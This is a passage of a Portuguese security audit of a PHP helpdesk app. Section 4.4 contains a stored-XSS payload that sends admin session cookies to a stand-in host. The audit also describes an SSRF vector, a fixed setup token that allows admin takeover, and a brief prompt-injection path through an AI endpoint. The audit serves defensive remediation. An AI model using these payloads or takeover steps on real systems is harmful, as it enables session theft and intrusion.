# Auditoria Técnica Forense — HelpTI

**Data:** 2026-09-03
**Escopo:** código-fonte completo (`*.php`, `scanner_rede.py`), schema parcial (`ti_chamados_backup.sql`, `missing_tables.sql`, `migrations.sql` + DDL embutido em runtime), configuração (`config.php`, `.user.ini`, `uploads/.htaccess`).
**Método:** leitura direta de código, rastreio de fluxo de dados (entrada → SQL → saída), verificação de autenticação/autorização por endpoint, análise de concorrência em jobs e estoque.
**Não validado (sem acesso):** schema real de produção, configuração de cron do cPanel, conteúdo de `config.local.php`, versão do PHP/MySQL em produção, se `arp-scan`/SNMP funcionam na Hostgator, dados reais.

> Convenção: **DOCUMENTADO / IMPLEMENTADO / PARCIAL / INCONSISTENTE / NÃO IMPLEMENTADO / NÃO VALIDADO**.

---

## 1. Executive Summary

O HelpTI é um monólito PHP procedural multi-page (~18.500 linhas, 76 arquivos) sem framework, sem Composer, sem testes, sem migrations versionadas. A engenharia de recursos é boa (CSRF centralizado, PDO prepared statements em ~100% das queries, rate-limit de login em banco, fila de e-mail, soft-delete, hash de senha moderno). O problema **não é a arquitetura** — é a **exposição operacional** e um conjunto pequeno de falhas críticas concretas:

1. **`setup.php` continua em produção** com token fixo `helpti2026` e faz `INSERT ... ON DUPLICATE KEY UPDATE senha=VALUES(senha)` no usuário admin → **tomada de conta total por qualquer pessoa na internet**.
2. **Não há `.htaccess` na raiz.** `*.bak`, `ti_chamados_backup.sql`, `migrations.sql`, `config.local.php.example`, `scan_ultimo.json` e `scan_rede_*.csv` estão fisicamente no webroot e são **baixáveis por URL** (o `.gitignore` protege o Git, não o servidor).
3. **Portal público expõe todos os chamados e pedidos** — nome, telefone, setor e descrição de cada solicitante, sem autenticação, com listagem e busca livres.
4. **XSS armazenado do portal público para a sessão do admin**: `setor`/`descricao` não são validados na entrada e são renderizados via `innerHTML` nos widgets de notificação e busca do painel autenticado.
5. **Condições de corrida em estoque e renovação de contrato**, e **jobs cron sem lock/idempotência** (e-mail duplicado, alerta SLA duplicado).
6. **Chave da API Gemini vai na query string** e o endpoint de IA é acionável sem login.

Nenhum destes exige reescrita. São correções cirúrgicas. O sistema é recuperável e vale a pena manter.

**Veredito global: 4/10 — Alto risco** (puxado para baixo por #1–#4; a base de código isolada valeria ~6).

---

## 2. Arquitetura Atual (real, verificada)

```
Navegador
  │
  ├── Área autenticada (sessão PHP)         ├── Portal público (SEM login)
  │   login.php → dashboard.php             │   portal.php  (abrir/acompanhar chamado,
  │   chamados / inventario / impressoras   │                pedir/acompanhar suprimento)
  │   contratos / manutencoes / usuarios    │   avaliar.php, status_chamado.php
  │   relatorios / exportar_*               │   abrir.php, acompanhar.php (só redirect)
  │   busca_global.php, notificacoes.php    │   api_ia.php?action=classificar
  │   api_stats.php, api_ferramentas.php    │
  │                                         │
  └──────────────┬──────────────────────────┘
                 │  cada arquivo: require db.php → session → require[Login|Admin|Gestora]
                 │  → csrfVerify (nos POST) → SQL (PDO prepared) → require layout.php → HTML
                 ▼
          db.php  (PDO singleton, helpers: h(), csrf*, auditLog, queueEmail,
                   notificarChamado, slaBadge, gerarNumero, $SETORES fallback[30])
                 │
                 ▼
          MySQL 8  (schema parcialmente versionado; 6 arquivos criam tabelas
                    via CREATE TABLE IF NOT EXISTS em runtime)
                 ▲
     ┌───────────┼───────────────┬────────────────────┐
 cron_email.php  cron_sla.php   snmp_coletar.php    cron_scanner.php
 (a cada 1min)   (a cada 30min) (a cada 4h, CLI)    → passthru(python3 scanner_rede.py)
 mail()          queueEmail     shell_exec(snmpget)   → scan_ultimo.json → reconcilia
                                file_get_contents(http://IP)  hosts_rede + inventario

 Integrações externas: SMTP (mail()), Google Gemini (curl), net-snmp, arp-scan
```

**God files:** `portal.php` (1193 linhas — 4 fluxos + toda a view), `layout.php` (920 — CSS + JS + navegação + busca + notificações), `contratos.php` (~780 — CRUD + renovação + templates jurídicos embutidos), `notificacoes.php` (10+ queries independentes).

**Regra de negócio espalhada:** SLA existe em 3 lugares (`db.php::slaHoras`, `db.php::slaBadge`, `cron_sla.php::$slaMap`) com os mesmos números repetidos. Lista de setores: tabela `setores` + array fixo de 30 itens em `db.php`. Status de inventário/impressora sincronizado por `match()` duplicado em `sync_inventario.php` (2×) e `cron_scanner.php`.

---

## 3. Arquitetura Alvo (incremental, sem reescrita)

Manter o monólito. Introduzir camadas **por dentro**, arquivo a arquivo:

```
/public/            → apenas os .php de entrada (front controllers finos)
/src/
  /Http/            → guards (Auth::require('admin')), Request, Csrf, RateLimit
  /Domain/
    Chamado/        → ChamadoService (transições de status, histórico obrigatório)
    Estoque/        → EstoqueService (movimentar com SELECT ... FOR UPDATE)
    Contrato/       → ContratoRenovacao (job idempotente, não em page load)
    Sla/            → SlaPolicy (única fonte dos números + horário comercial)
  /Infrastructure/
    Db.php, Mailer.php, Gemini.php, Snmp.php (com allowlist de IP)
/database/
  /migrations/      → 0001_init.sql, 0002_*.sql ... aplicadas por script, nunca em runtime
/bin/               → cron_email.php, cron_sla.php etc. com lock de arquivo (flock)
```

Ordem: (1) tirar DDL de runtime → migrations; (2) extrair `EstoqueService` e `SlaPolicy`; (3) mover renovação de contrato para `bin/cron_contratos.php`; (4) `Auth` guard único. Cada passo é um PR pequeno, compatível com produção.

---

## 4. Security Audit

### 4.1 Autenticação — IMPLEMENTADO, com lacunas

| Item | Estado | Observação |
|---|---|---|
| Hash de senha | OK | `password_hash(PASSWORD_DEFAULT)` + `password_verify` |
| Session fixation | OK | `session_regenerate_id(true)` no login (`login.php:27`) |
| CSRF no login | OK | tratado como erro de form, não `die()` |
| Rate limit login | PARCIAL | só por **IP** (`login_attempts`), 5/5min. Clínica atrás de 1 IP NAT → um atacante trava o prédio inteiro; e conta-alvo nunca é bloqueada |
| Timeout / lifetime de sessão | NÃO IMPLEMENTADO | sem `cookie_lifetime`, sem expiração absoluta, sem idle timeout |
| Revogação de privilégio | NÃO IMPLEMENTADO | `$_SESSION['usuario']['perfil']` é snapshot do login; admin rebaixado continua admin até relogar |
| Enumeração de e-mail no reset | OK | mensagem genérica em `esqueci_senha.php` |
| Rate limit em reset / abrir chamado / IA | NÃO IMPLEMENTADO | e-mail bombing e spam de chamados possíveis |

### 4.2 Autorização por endpoint

| Endpoint | Auth | Papel | CSRF | Risco |
|---|---|---|---|---|
| `chamado.php` | requireLogin | qualquer técnico | sim | qualquer técnico edita/atribui/fecha qualquer chamado (aceitável p/ o modelo, mas sem trilha de "quem podia") |
| `excluir_chamado.php` | requireLogin | qualquer técnico | sim | técnico comum faz soft-delete de qualquer chamado |
| `excluir_impressora.php` | requireLogin | qualquer técnico | sim | idem |
| `usuarios.php` | requireAdmin | admin | sim | OK |
| `exportar_relatorio.php` | requireGestora | gestora+ | — (GET) | OK |
| `importar_inventario.php` | requireGestora | gestora+ | sim | OK |
| `api_ia.php` (`classificar`) | **NENHUM** | público | sim* | *token obtido do próprio `portal.php` → efetivamente aberto; custo/abuso Gemini |
| `sync_inventario.php` | **NENHUM guard** | — | — | arquivo só define funções; **NÃO VALIDADO** se é alvo direto de request — se for, é bypass total. Confirmar que não há roteamento para ele |
| `portal.php` (acompanhar) | **NENHUM** | público | — | ver 4.6 |
| `avaliar.php` | **NENHUM** (só ID) | público | não | IDOR — ver 4.6 |

**Ação:** `excluir_*` e ações destrutivas deveriam exigir `requireGestora`. Confirmar que `sync_inventario.php`, `estoque_helpers.php`, `impressoras_helpers.php`, `gemini.php` retornam 403 se acessados diretamente (hoje eles apenas "não fazem nada", mas expõem estrutura e, no caso de `gemini.php` incluído fora de contexto, nada).

### 4.3 CSRF — IMPLEMENTADO (bom)

`csrfVerify()` presente em praticamente todos os POST autenticados verificados (`chamado.php`, `editar_chamado.php`, `excluir_chamado.php`, `usuarios.php`, `pedidos_suprimentos.php`, `contratos.php`, `api_ferramentas.php`, `importar_inventario.php`, `api_ia.php`).

**Endpoints que NÃO exigem CSRF e mutam estado:**
- `portal.php` — `abrir_chamado`, `pedir_suprimento`, `avaliar_chamado_id` (POST público; tem `csrfField()` no form de abrir mas **não chama `csrfVerify()`** no handler — o token é decorativo). Baixo impacto (é público mesmo), mas permite CSRF de spam.
- `avaliar.php` — POST sem token.

### 4.4 XSS — **CRÍTICO (stored, público → admin)**

PHP server-side: `h()` (= `htmlspecialchars ENT_QUOTES`) é usado de forma consistente nas views. Contexto HTML OK. **Problema nos widgets JavaScript que montam `innerHTML`:**

`layout.php:737-746` (`carregarNotificacoes`):
```js
list.innerHTML = d.itens.map(n => `... <div class="notif-texto">${n.texto}</div> ...`).join('');
```
`layout.php:784-789` (busca global `render`):
```js
html += `... <div class="busca-titulo">${it.titulo}</div>
             <div class="busca-sub">${it.sub}</div> ...`;
```

Fonte de `n.texto` (`notificacoes.php:24`): `"Chamado {$r['numero']} ({$r['setor']}) foi atribuído a você"`.
Fonte de `it.titulo`/`it.sub` (`busca_global.php:29`): inclui `descricao` e `setor` do chamado.

`setor` e `descricao` entram por **`portal.php` abrir_chamado** (`portal.php:24-29`) com validação apenas de "não vazio" / comprimento mínimo — **`setor` NÃO é validado contra a lista `$SETORES`**. Um chamado aberto anonimamente com
`setor = <img src=x onerror="fetch('//evil/'+document.cookie)">`
executa **na sessão do técnico/admin** assim que ele abre o painel de notificações ou digita na busca global.

**Severidade: CRÍTICA.** Vetor não autenticado, alvo é a conta mais privilegiada, persistente.

**Correção imediata:** escapar no cliente (`textContent` ou função `esc()` antes de interpolar) **e** validar `setor ∈ $SETORES` no servidor em `portal.php`. Correção estrutural: nunca usar `innerHTML` com dado de usuário; padronizar um helper `esc()` no `layout.php`.

### 4.5 SQL Injection — **BAIXO** (bem defendido)

Todas as queries verificadas usam PDO prepared statements com placeholders. `EMULATE_PREPARES => false` (bom). Casos de interpolação encontrados, todos **seguros**:
- `portal.php:136` — `LIMIT $fc_limite OFFSET $fc_offset` — valores derivados de `(int)` cast. Seguro.
- `avaliar.php:26` — `"SELECT COUNT(*) FROM avaliacoes WHERE chamado_id = {$id}"` — `$id = (int)($_GET['id'])` na linha 6. **Seguro**, porém é código ruim (linha 25-26 mistura `(bool)...->execute()` com query crua; ver 12).
- `sync_inventario.php:15,135,150` — `IN ($placeholders)` / `implode(' AND ', $where)` — placeholders e cláusulas fixas, params vêm por bind. Seguro. (Linhas 137-139 têm uma expressão monstruosa que chama `prepare/execute` 3×; ver 12.)

Nenhuma ocorrência de `$_GET`/`$_POST` concatenado em SQL foi encontrada.

### 4.6 Portal público / IDOR / privacidade — **CRÍTICO**

`portal.php` aba "Acompanhar" (`portal.php:115-138`, `216-237`):
- **Lista todos os chamados** — código, solicitante (nome completo), setor, nível, status, data — paginado, com **filtro por setor e busca por nome/descrição**. Sem autenticação.
- **Lista todos os pedidos de suprimento** — solicitante, setor, itens.
- Busca por `numero_chamado` retorna **detalhe completo**: descrição integral, resolução, timeline com nomes dos técnicos, **imagens anexadas** (`portal.php:599-606`).

O número é `CHM-2026-00001` (`db.php:58`) — **sequencial e previsível**. `CHM-2026-00002`, `-00003`... enumera todo o histórico de suporte da clínica: nomes, ramais, problemas ("computador da Dra. X com vírus", prints de sistemas médicos).

`avaliar.php?id=N` — `id` é a **PK inteira sequencial**. Sem token. Qualquer um enumera `id=1..N` e **submete/sobrescreve avaliações** de chamados de terceiros (o `portal.php` usa `ON DUPLICATE KEY UPDATE`, o `avaliar.php` usa `INSERT` puro — ver 14).

`status_chamado.php:9` — regex `^CHM-[A-Z0-9]{6}$` **não casa** com o formato real `CHM-2026-00001` → o endpoint responde sempre 400. Código morto (INCONSISTENTE).

**Impacto LGPD:** exposição não autenticada de dados pessoais (nome, telefone, setor, conteúdo de solicitação, imagens) de todos os colaboradores. Ver seção 14.

**Correção imediata:**
- "Acompanhar" só deve retornar detalhe mediante **par (número + algo não-enumerável)** — ex.: token opaco gerado na abertura, enviado ao solicitante; ou pelo menos remover a listagem geral e a busca por nome.
- `avaliar.php` deve exigir token único por chamado (coluna `avaliacao_token`), não `id`.
- `numero` do chamado deveria ter componente aleatório (`CHM-2026-A7F3K9`) — o placeholder no HTML (`portal.php:673` "Ex: CHM-8D4A2B") sugere que essa era a intenção original.

### 4.7 Command Injection — **BAIXO**

`snmp_coletar.php:301-316` — `shell_exec('snmpget ... ' . escapeshellarg($ip) . ' ' . escapeshellarg($oid))`. `escapeshellarg` presente nos dois argumentos. `$oid` é sempre literal do código. `$ip` vem de `impressoras.ip`. **Sem injeção de shell.** Sem `-t`/timeout global além do `-t 2 -r 1`. Sem limite de output. `$ip` não é validado como IP (poderia ser hostname arbitrário → ver SSRF).

`cron_scanner.php:24` — `passthru('cd ' . escapeshellarg(__DIR__) . ' && python3 scanner_rede.py 2>&1')` — sem input de usuário. OK.

`scanner_rede.py` — `subprocess.check_output('ip route show', shell=True)` e `f'ip route get {base_ip}'` com `shell=True`; `base_ip` vem de `sys.argv` (CIDR passado por quem configura o cron). Não é entrada web, mas `shell=True` com f-string é má prática — trocar por lista de args.

### 4.8 SSRF — **MÉDIO**

`snmp_coletar.php:332,348` — `hp_toner_xml()` / `hp_modelo_http()`:
```php
$xml = @file_get_contents("http://{$ip}/DevMgmt/ConsumableConfigDyn.xml", false,
    stream_context_create(['http' => ['timeout' => 3]]));
```
`$ip` = `impressoras.ip`, definido por técnico/gestora em `editar_impressora.php` (autenticado). Um usuário autenticado com acesso a impressoras pode apontar `ip` para `169.254.169.254`, `127.0.0.1:<porta admin>`, hosts internos, e o **servidor** faz a requisição. Retorno é filtrado por regex (`<dd:MakeAndModel>`), então é SSRF semi-cego (bom para varredura de portas por timing, ruim para exfiltração direta). Roda no cron, não on-demand.

**Correção:** validar `$ip` com `filter_var($ip, FILTER_VALIDATE_IP)` + allowlist de faixas RFC1918 da clínica; bloquear `169.254/16`, `127/8`, loopback IPv6.

### 4.9 Gemini API — **MÉDIO/ALTO**

`gemini.php:12`:
```php
$url = 'https://.../gemini-3.5-flash-lite:generateContent?key=' . $key;
```
Chave na **query string** → aparece em logs de acesso do PHP-FPM, em qualquer proxy/WAF intermediário, no histórico de `error_log` se a URL for logada. Google aceita header `x-goog-api-key` — usar isso.

`api_ia.php:20-22` — `classificar` roda **sem `requireLogin()`**. CSRF é exigido mas o token está no HTML público de `portal.php`. Resultado: qualquer visitante script-ável chama o endpoint em loop → **custo de API e rate-limit da conta Google** consumidos por terceiros. Sem throttle, sem cache.

**Prompt injection:** `$_POST['descricao']` entra cru no prompt (`api_ia.php:47`). O output só alimenta `nivel`/`categoria` (comparados contra lista fixa) e `justificativa` (exibida). Blast radius limitado, mas `justificativa` volta ao cliente e alguém pode fazer o modelo devolver conteúdo arbitrário exibido no portal. Baixo, mas real.

`geminiAsk` também engole todo erro (`return ''`), sem log → falha de IA é invisível para operação.

### 4.10 Exposição de arquivos — **CRÍTICO**

Não há `.htaccess` na raiz (`ls: .htaccess inexistente`). Presentes no webroot e **serviíveis por HTTP**:

| Arquivo | Conteúdo | Via `.gitignore`? |
|---|---|---|
| `abrir.php.bak`, `acompanhar.php.bak`, `pedir_suprimento.php.bak`, `acompanhar_suprimentos.php.bak` | código-fonte servido como **texto** (Apache não parseia `.bak`) | sim (Git), não (web) |
| `ti_chamados_backup.sql` | dump — hashes de senha, e-mails, PII | sim (Git), não (web) |
| `migrations.sql`, `missing_tables.sql` | estrutura completa do schema | **explicitamente incluídos** |
| `config.local.php.example` | modelo de credenciais (revela nomes de constantes, host) | **rastreado no Git** |
| `scan_ultimo.json`, `scan_rede_*.csv` | **topologia da rede interna** — IPs, MACs, hostnames, portas abertas, setores | sim (Git), não (web) |
| `setup.php` | instalador (ver 4.11) | não |

`.gitignore` cobre o repositório, **não o servidor de arquivos**. Se o deploy é `git pull` no webroot (típico cPanel), os `.bak` e `.sql` que já existem lá continuam acessíveis.

**Correção imediata:**
1. `.htaccess` na raiz negando `\.(bak|sql|json|csv|md|example|py|log)$` e `config*.php` a acesso direto (ou melhor: mover o webroot para `/public`).
2. `rm` de todos os `.bak`, `*.sql`, `scan_*` do servidor de produção.
3. Verificar imediatamente se `https://helpti.pageup.net.br/ti_chamados_backup.sql` responde 200.

### 4.11 `setup.php` — **CRÍTICO (RCE-equivalente: account takeover)**

`setup.php:11` — `define('SETUP_TOKEN', 'helpti2026')`.
`setup.php:296` —
```php
INSERT INTO usuarios (nome,email,senha,perfil,ativo) VALUES (?,?,?,'admin',1)
ON DUPLICATE KEY UPDATE nome=VALUES(nome), senha=VALUES(senha), perfil='admin', ativo=1
```

Qualquer pessoa que acesse `setup.php?token=helpti2026` (token fixo, no repositório, em texto claro) e submeta o form **redefine a senha do admin existente** (`ON DUPLICATE KEY UPDATE senha=...` casa pelo `UNIQUE(email)`) e ganha acesso total. Também recria tabelas e insere dados demo.

O próprio arquivo diz (`setup.php:417`): *"Apague o arquivo setup.php agora!"* — mas ele está no repo e provavelmente no servidor.

**Correção imediata:** `rm setup.php` em produção. Nunca versionar instalador com token fixo; se precisar, gerar token aleatório por execução e exigir que o arquivo seja recriado.

---

## 5. Database Audit

**Fonte da verdade fragmentada (INCONSISTENTE):**
- `ti_chamados_backup.sql` — 4 tabelas (`chamados`, `historico`, `setores`, `usuarios`), desatualizado: a tabela `chamados` no dump **não tem** `deleted_at`, `fechado_em`, `sla_alerta_enviado`, `telefone_solicitante`, `categoria_id`, `inventario_id` — todas usadas no código.
- `missing_tables.sql` — 5 tabelas.
- `migrations.sql` — `password_resets`, `login_attempts`, `sequences`, `audit_log`, `knowledge_base`, `impressoras_snapshot`, `email_queue`.
- **DDL em runtime** (`CREATE TABLE IF NOT EXISTS` em request-time): `estoque_helpers.php` (`estoque_movimentos`), `esqueci_senha.php` (`password_resets` de novo, definição divergente), `contratos.php` (`contratos_renovacoes`), `cron_scanner.php` (`hosts_rede`), `snmp_coletar.php` (`impressoras_snapshot` de novo, divergente do `migrations.sql`), `setup.php` (tudo).

`password_resets` tem **duas definições** (`migrations.sql` vs `esqueci_senha.php:14`) e `impressoras_snapshot` tem duas (`migrations.sql` vs `snmp_coletar.php:15`). Quem roda primeiro vence; a segunda é no-op silencioso. Divergência prod/dev garantida.

**Chaves estrangeiras (verificado no que existe):**
- OK: `historico→chamados` (CASCADE), `historico→usuarios` (SET NULL), `chamados→usuarios` (SET NULL), `estoque_movimentos→tipos_suprimentos` (CASCADE), `pedidos_suprimentos_itens→pedidos` (CASCADE), `hosts_rede→inventario` (SET NULL), `contratos_renovacoes→contratos` (CASCADE), `impressoras_snapshot→impressoras` (CASCADE).
- **Ausentes / implícitas:**
  - `chamados.setor` — VARCHAR livre, sem FK para `setores.nome`. Portal aceita qualquer string (ver 4.4). Renomear um setor órfã todos os chamados históricos.
  - `chamados.categoria_id`, `chamados.inventario_id` — NÃO VALIDADO se têm FK (não aparecem no dump).
  - `avaliacoes.chamado_id` — precisa de `UNIQUE` para o `ON DUPLICATE KEY UPDATE` de `portal.php:90` funcionar. Se não houver UNIQUE, **duplicatas** e o "já avaliado" de `avaliar.php` fica inconsistente. NÃO VALIDADO — **verificar com urgência**.
  - `pedidos_suprimentos.impressora_id` — SET NULL: excluir impressora zera o vínculo do pedido histórico (aceitável, mas perde rastreabilidade).
  - `email_queue` — sem índice em `(enviado_em, tentativas, criado_em)` → o `SELECT ... WHERE enviado_em IS NULL AND tentativas < 3 ORDER BY criado_em` faz scan crescente.

**Dados derivados armazenados (dívida):** `chamados.semana` (`getSemana()` — recalculável), `tipos_suprimentos.estoque_atual` (deveria ser `SUM` de `estoque_movimentos` — ver 6), `chamados.status`+`fechado_em` sem CHECK de coerência.

**Charset:** `utf8mb4` consistente. Engine InnoDB consistente. Bom.

---

## 6. Transaction & Concurrency Audit

### 6.1 Estoque — **race condition + falta de idempotência (ALTO)**

`estoque_helpers.php:29-57` `estoque_movimentar()`:
```php
$pdo->beginTransaction();
$pdo->prepare("UPDATE tipos_suprimentos SET estoque_atual = GREATEST(0, estoque_atual + ?) WHERE id = ?")->execute([$delta, $id]);
$pdo->prepare("INSERT INTO estoque_movimentos (...) VALUES (...)")->execute([...]);
$pdo->commit();
```
- Há transação e o `UPDATE ... SET x = x + ?` é atômico **por linha** — o saldo em si não corrompe com concorrência de *movimentos*.
- **Mas não há `SELECT ... FOR UPDATE`** e nenhuma checagem de idempotência. O problema real está no chamador:

`pedidos_suprimentos.php:25-30` (`action=entregar`):
```php
$stmt = $pdo->prepare("UPDATE pedidos_suprimentos SET status='Entregue', observacoes_entrega=? WHERE id=?");
$stmt->execute([...]);            // NÃO checa status anterior
estoque_debitar_pedido($pdo, $pedido_id, ...);   // debita todos os itens
```
Nada impede `status` já ser `'Entregue'`. **Duplo POST (clique duplo, retry de rede, 2 abas)** → estoque debitado **duas vezes**, linhas duplicadas em `estoque_movimentos`. Idem `action=aprovar`. Não há `WHERE id=? AND status='Pendente'` nem transação envolvendo os dois passos.

Cenário da prompt (saldo 10, req A=7, req B=6): com o `GREATEST(0, ...)` o saldo final é 0 (não fica negativo), mas **ambas as entregas são marcadas como concluídas** tendo saído só 10 de 13 unidades → estoque físico e sistema divergem, sem alerta.

**Correção imediata:** `UPDATE pedidos_suprimentos SET status='Entregue' WHERE id=? AND status IN ('Pendente','Aprovado')` e só debitar se `rowCount() === 1`; envolver marcação + débito na **mesma transação**.
**Correção estrutural:** `estoque_atual` como cache reconstruível; job de reconciliação `estoque_atual == SUM(entradas) - SUM(saidas) + SUM(ajustes)`.

### 6.2 Renovação de contrato — **side effect em GET + execução dupla (ALTO)**

`contratos.php:152-178` roda **em todo carregamento da página** (qualquer GET de `contratos.php`), sem transação, sem lock:
```php
$pdo->exec("UPDATE contratos SET status='Vencido' WHERE data_vencimento < CURDATE() AND status='Ativo' AND renovacao_auto=0");
$auto_vencidos = $pdo->query("SELECT ... WHERE data_vencimento < CURDATE() AND status='Ativo' AND renovacao_auto=1")->fetchAll();
foreach ($auto_vencidos as $c) {
    $nova_data = new DateTime($c['data_vencimento']);
    // ... modify por periodicidade ...
    $pdo->prepare("UPDATE contratos SET data_vencimento=? WHERE id=?")->execute([...]);
    $pdo->prepare("INSERT INTO contratos_renovacoes (...) VALUES (...,'auto')")->execute([...]);
}
```
- **Dois gestores abrindo `contratos.php` ao mesmo tempo** → ambos leem o mesmo `$auto_vencidos` → contrato renovado 2×, `data_vencimento` avançada 2×, 2 linhas em `contratos_renovacoes`. `notificacoes.php:70-80` então mostra "renovado automaticamente" — possivelmente 2×.
- **NÃO VALIDADO:** se há `while` para contratos vencidos há vários períodos. Se for `if` (só +1 período), um contrato Mensal vencido há 8 meses fica com data futura errada (avança 1 mês só). Se for `while`, 8 renovações + 8 linhas de histórico de uma vez, no meio de um page load.
- Timezone: `CURDATE()` do MySQL vs `date_default_timezone_set('America/Sao_Paulo')` do PHP — se o servidor MySQL estiver em UTC, a virada de dia diverge ~3h.

**Correção:** mover para `bin/cron_contratos.php` com `flock`, transação por contrato, e `UPDATE ... WHERE id=? AND data_vencimento=?` (optimistic lock) para não renovar o que outro processo já renovou.

### 6.3 `gerarNumero()` — OK

`db.php:56` — `UPDATE sequences SET value = LAST_INSERT_ID(value+1)` + `SELECT LAST_INSERT_ID()`. Atômico por conexão no MySQL. **Sem race condition.** Bom. (Mesmo padrão replicado inline em `portal.php:175` para `suprimentos` — deveria ser função compartilhada.)

### 6.4 Resumo

| Operação | Transação | Lock | Idempotente | Race | Correção |
|---|---|---|---|---|---|
| `estoque_movimentar` | sim | não | não | parcial | FOR UPDATE + guard no chamador |
| entrega de pedido | **não** | não | **não** | **sim** | `WHERE status=...` + rowCount |
| renovação auto contrato | não | não | **não** | **sim** | mover p/ cron + optimistic lock |
| `gerarNumero` | n/a | atômico | sim | não | — |
| `cron_email` | não | **não** | **não** | **sim** | flock + estado `processing` |
| `cron_sla` | não | não | parcial (flag) | janela | flock |
| `cron_scanner` | não | **não** | **não** | **sim** | flock + escrita atômica do JSON |

---

## 7. Business Rules Audit

- **Workflow de chamado** (`chamado.php:34-46`): qualquer transição de status é permitida (dropdown livre: Aberto↔Em Andamento↔Pendente↔Concluído, e volta). Não há máquina de estados. Reabertura de "Concluído" não é registrada como evento especial. `fechado_em` só é setado na 1ª conclusão (`IF(status != 'Concluído' AND ? = 'Concluído', NOW(), fechado_em)`) — reabrir e reconcluir mantém a data antiga (pode ser desejado, mas não é documentado).
- **Histórico obrigatório:** `chamado.php` grava `historico` em toda atualização — OK. Mas `excluir_chamado.php` só grava `audit_log`, não `historico`. `portal.php` avaliação não gera histórico.
- **Avaliação:** `portal.php:85` exige `status='Concluído'` e usa `ON DUPLICATE KEY UPDATE` (permite **reavaliar / sobrescrever**). `avaliar.php:30` exige `!$jaAvaliado` e faz `INSERT` puro (**não** permite reavaliar). Duas regras opostas para a mesma tabela.
- **Nível "A Definir":** chamados abertos pelo portal entram sem nível → SLA não se aplica (`slaHoras` retorna `null`) até um técnico classificar. Um chamado esquecido sem classificação **nunca dispara alerta de SLA**. Lacuna operacional real.
- **`getSemana()`** (`db.php:61`): "Semana 01" = dias 1–7 do mês. Não é semana ISO nem semana de trabalho. Relatórios por "semana" são idiossincráticos.

---

## 8. Cron & Jobs Audit

| Cron | Freq. sugerida | Lock | Log | Retry | Idempotente | Risco principal |
|---|---|---|---|---|---|---|
| `cron_email.php` | 1 min | **não** | stdout→arquivo | `tentativas<3` | **não** | 2 execuções sobrepostas enviam o mesmo e-mail 2× |
| `cron_sla.php` | 30 min | **não** | não | não | flag `sla_alerta_enviado` | janela entre `SELECT` e `UPDATE flag=1` → e-mail duplicado; "SLA" é relógio de parede, não horário comercial |
| `snmp_coletar.php` | 4 h | **não** | stdout | `-r 1` por OID | snapshots acumulam (inserção nova sempre) | execução > 4h com muitas impressoras → sobreposição; sem timeout global |
| `cron_scanner.php` | diário | **não** | stdout | não | **não** | `scan_ultimo.json` escrito não-atomicamente pelo Python; `UPDATE hosts_rede SET online=0` + falha parcial → hosts marcados offline errado → inventário flipado p/ "Em Uso" e alertas falsos |

**`cron_email.php:9`** — guarda de SAPI com lógica invertida e confusa:
```php
if (PHP_SAPI !== 'cli' && (!isset($_SERVER['HTTP_HOST']) === false)) { http_response_code(403); exit; }
```
`(!isset(...) === false)` = `isset($_SERVER['HTTP_HOST'])`. Então: bloqueia se `não-CLI E tem HTTP_HOST`. Funciona por acidente, mas ilegível. `cron_sla.php:8` faz a versão limpa (`PHP_SAPI !== 'cli' && isset($_SERVER['HTTP_HOST'])`). `snmp_coletar.php` e `cron_scanner.php` **não têm guarda nenhuma** — definem `CLI_RUN` mas nada checa. Se estiverem no webroot, são executáveis por HTTP (disparam SNMP/scan sob demanda de qualquer visitante). **NÃO VALIDADO** se estão fora do webroot.

**`cron_email` claim pattern:** o correto é `UPDATE email_queue SET status='processing', locked_at=NOW() WHERE id IN (...) AND status='pending'` e só então processar os que o `rowCount` confirmou. Hoje dois workers pegam o mesmo `SELECT`.

**Idempotência por cenário (resposta direta à prompt):**
- `cron_email` 2 instâncias → **sim, e-mail pode sair 2×**.
- `cron_sla` 2× → e-mail duplicado só na janela de corrida (pequena); flag previne reenvio posterior.
- renovação automática 2× → **sim, contrato avança 2×** (ver 6.2).
- `cron_scanner` 2× simultâneos → **corrompe `scan_ultimo.json`** e/ou reconciliação com dados parciais.

---

## 9. Integration Audit

| Integração | Timeout | Retry | Trata falha | Observação |
|---|---|---|---|---|
| SMTP (`mail()`) | do PHP | `tentativas<3` | marca `erro` | `@mail()` retorno não confiável (só diz que entregou ao MTA local); sem DKIM/SPF garantido; `From` fixo |
| Gemini (curl) | 30s | **não** | `return ''` silencioso | chave na URL; sem log de erro; sem cache; endpoint público |
| net-snmp (`snmpget`) | `-t 2 -r 1` (~4s/OID) | 1 | `return null` | ~7 OIDs por impressora = ~28s pior caso × N impressoras, serial |
| HP EWS (`file_get_contents http`) | 3s | não | `return null` | **SSRF** (4.8); `allow_url_fopen` requerido |
| arp-scan (Python) | nenhum | não | `sys.exit(1)` | precisa root/raw socket — **quase certamente não funciona em Hostgator compartilhado**; feature provavelmente morta em prod (NÃO VALIDADO) |

**SNMP community fixa `public`** hardcoded (`snmp_coletar.php:302`, `scanner_rede.py:177`). Sem suporte a v3. Aceitável em rede isolada, mas qualquer um na rede lê os contadores.

---

## 10. Performance Audit

**Queries com gargalo provável:**

| Local | Query | Problema | Índice necessário |
|---|---|---|---|
| `busca_global.php:14-88` | 4× `... LIKE '%q%'` em chamados/inventario/contratos/usuarios | **wildcard à esquerda = full scan**, dispara a cada 220ms de digitação | FULLTEXT em `chamados(descricao)`, `inventario(marca,modelo,numero_serie)` |
| `portal.php:127,226` | `descricao LIKE '%...%'` na listagem pública | full scan, endpoint anônimo (DoS barato) | idem + limitar/remover busca pública |
| `notificacoes.php` | 12 queries independentes, subquery correlacionada p/ último snapshot (`s.id = (SELECT id ... ORDER BY coletado_em DESC LIMIT 1)`) | roda a cada 60s por usuário logado (`layout.php:763`) | `impressoras_snapshot(impressora_id, coletado_em)` composto; considerar tabela `impressoras_ultimo_snapshot` |
| `cron_email.php:19` | `WHERE enviado_em IS NULL AND tentativas<3 ORDER BY criado_em` | scan crescente conforme a fila acumula histórico | `email_queue(enviado_em, criado_em)` |
| `cron_sla.php:25` | LEFT JOIN com subquery `(SELECT email ... LIMIT 1) ON 1=1` | cartesiano de 1 linha — ok, mas gambiarra | reescrever |

`SELECT *` presente em `portal.php` (`c.*`, `s.*`), `chamado.php`, `api_ia.php` — traz `descricao`/`resolucao`/`imagens` (TEXT) sem necessidade em listagens.

`notificacoes.php` roda **10-12 SELECTs a cada minuto para cada aba aberta** de cada técnico — com 5 técnicos e 3 abas cada = ~180 queries/min de fundo. Não é crítico hoje, mas é desperdício estrutural (deveria ser 1 endpoint cacheado 30-60s).

---

## 11. Scalability Audit

